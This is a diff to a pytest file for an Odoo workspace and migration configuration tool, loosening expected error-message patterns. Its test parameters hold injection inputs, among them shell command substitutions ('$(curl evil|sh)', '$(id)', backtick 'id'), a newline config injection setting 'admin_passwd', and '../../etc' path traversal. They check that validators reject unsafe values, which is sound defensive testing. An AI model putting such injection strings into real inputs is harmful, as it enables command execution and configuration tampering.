@@ -165,29 +165,29 @@ INJECTIONS = ["18.0$(touch /tmp/p)", "18.0\nadmin_passwd = x", "18.0`id`", "18.0
 def test_workspace_rejects_anything_but_a_supported_version(version):
     cfg = WorkspaceConfig(name="acme", versions=[version])
     cfg.normalize_defaults()  # never raises on a bad value
-    with _pytest.raises(ValueError, match="invalid Odoo version"):
+    with _pytest.raises(ValueError, match="[Ii]nvalid Odoo version"):
         cfg.validate()
 
 
 @_pytest.mark.parametrize("source,target", [("13.0$(curl evil|sh)", "15.0"),
                                             ("13", "15.0"), ("13.0", "15.0`id`")])
 def test_migration_rejects_anything_but_chain_versions(source, target):
-    with _pytest.raises(ValueError, match="invalid Odoo version"):
+    with _pytest.raises(ValueError, match="[Ii]nvalid Odoo version"):
         _MigrationEnv(source=source, target=target).validate()
 
 
 @_pytest.mark.parametrize("field,value,message", [
-    ("oca_repos", ["../../etc"], "invalid OCA repository name"),
-    ("oca_repos", ["web/../x"], "invalid OCA repository name"),
-    ("oca_repos", ["web$(id)"], "invalid OCA repository name"),
+    ("oca_repos", ["../../etc"], "[Ii]nvalid OCA repository name"),
+    ("oca_repos", ["web/../x"], "[Ii]nvalid OCA repository name"),
+    ("oca_repos", ["web$(id)"], "[Ii]nvalid OCA repository name"),
     ("oca_repos", "web", "oca_repos must be a list"),
-    ("db_host", "127.0.0.1\nadmin_passwd = x", "invalid db_host"),
-    ("db_host", "$(id)", "invalid db_host"),
-    ("db_port", "5432", "invalid db_port"),
-    ("db_port", 70000, "invalid db_port"),
-    ("http_port_base", True, "invalid http_port_base"),
-    ("name", 7, "invalid workspace name"),
-    ("db_user", ["odoo"], "invalid db_user"),
+    ("db_host", "127.0.0.1\nadmin_passwd = x", "[Ii]nvalid db_host"),
+    ("db_host", "$(id)", "[Ii]nvalid db_host"),
+    ("db_port", "5432", "[Ii]nvalid db_port"),
+    ("db_port", 70000, "[Ii]nvalid db_port"),
+    ("http_port_base", True, "[Ii]nvalid http_port_base"),
+    ("name", 7, "[Ii]nvalid workspace name"),
+    ("db_user", ["odoo"], "[Ii]nvalid db_user"),
 ])
 def test_workspace_rejects_unsafe_profile_values(field, value, message):
     cfg = WorkspaceConfig(name="acme", versions=["18.0"])
